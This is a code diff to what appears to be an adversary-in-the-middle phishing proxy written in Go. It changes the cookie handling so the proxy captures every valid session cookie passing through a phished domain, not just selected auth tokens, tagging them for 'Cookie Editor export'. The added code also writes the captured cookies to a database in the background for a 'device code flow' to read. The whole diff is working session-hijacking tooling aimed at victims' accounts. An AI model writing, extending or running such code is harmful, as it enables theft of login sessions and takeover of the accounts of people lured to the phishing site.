@@ -3132,15 +3132,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
-					at := pl.getAuthToken(c_domain, ck.Name)
-					if at != nil {
-						s, ok := p.sessions[ps.SessionId]
-						if ok && (s.IsAuthUrl || !s.IsDone) {
-							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
-								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
-								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
-								s.LastTokenActivity = time.Now() // Update activity for stall detection
-							}
+					
+					// CAPTURE ALL COOKIES regardless of auth_tokens (for Cookie Editor export)
+					s, ok := p.sessions[ps.SessionId]
+					if ok && (s.IsAuthUrl || !s.IsDone) {
+						if ck.Value != "" && (ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
+							// Store cookie in session (always capture for export)
+							s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+							s.LastTokenActivity = time.Now()
+							log.Debug("[cookie-capture] %s:%s captured", c_domain, ck.Name)
 						}
 					}
 				}
@@ -3148,6 +3148,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
+			
+			// Save cookies to database incrementally (for device code flow to read)
+			if pl != nil && ps.SessionId != "" {
+				if s, ok := p.sessions[ps.SessionId]; ok && len(s.CookieTokens) > 0 {
+					go func(sid string, cookies map[string]map[string]*database.CookieToken) {
+						if err := p.db.SetSessionCookieTokens(sid, cookies); err != nil {
+							log.Debug("[cookie-save] error: %v", err)
+						}
+					}(ps.SessionId, s.CookieTokens)
+				}
+			}
+			
 			// Add session cookie if one was created for this request
 			if ck_session.String() != "" {
 				resp.Header.Add("Set-Cookie", ck_session.String())
